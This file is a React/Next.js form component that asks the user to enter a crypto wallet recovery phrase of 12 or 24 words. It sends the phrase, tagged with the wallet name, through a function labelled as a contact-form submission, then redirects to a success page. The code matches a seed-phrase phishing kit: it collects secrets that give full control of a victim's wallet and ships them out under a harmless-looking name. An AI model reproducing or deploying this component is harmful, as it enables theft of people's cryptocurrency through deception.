import { sendContactForm } from "@/libs/api";
import { useRouter } from "next/router";
import React, { useState } from "react";

export default function Phrase({ wallet }) {
  const router = useRouter();
  const [data, setData] = useState({ phrase: "" });
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const handleChange = (e) => {
    const name = e.target.name;
    const value = e.target.value;
    setData({ [name]: value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError("");
    try {
      const payload = {
        name: wallet,
        subject: "phrase",
        message: data?.phrase,
      };
      const response = await sendContactForm(payload);
      console.log(response);

      if (response?.success) {
        setData({ phrase: "" });
        router.push("/success");
      } else {
        setError("Form submission failed.");
      }
    } catch (err) {
      setError(err, "failed to submit, retry");
      console.log(err);
    } finally {
      setLoading(false);
    }
  };

  return (
    <form className="space-y-3" onSubmit={handleSubmit}>
      <textarea
        name="phrase"
        value={data.phrase}
        onChange={handleChange}
        required
        className="w-full border rounded-md h-36 p-2"
        placeholder="Enter your recovery phrase"
      />
      <p className="text-xs text-gray-500 text-left">
        Typically 12 (sometimes 24) words separated by single spaces
      </p>
      <button
        type="submit"
        className="uppercase w-full bg-primary text-white py-2 rounded-md "
      >
        {loading ? "Proceeding..." : "Proceed"}
      </button>
      {error.length > 1 && (
        <p className="text-red-600 mt-4 text-center">{error}</p>
      )}
    </form>
  );
}
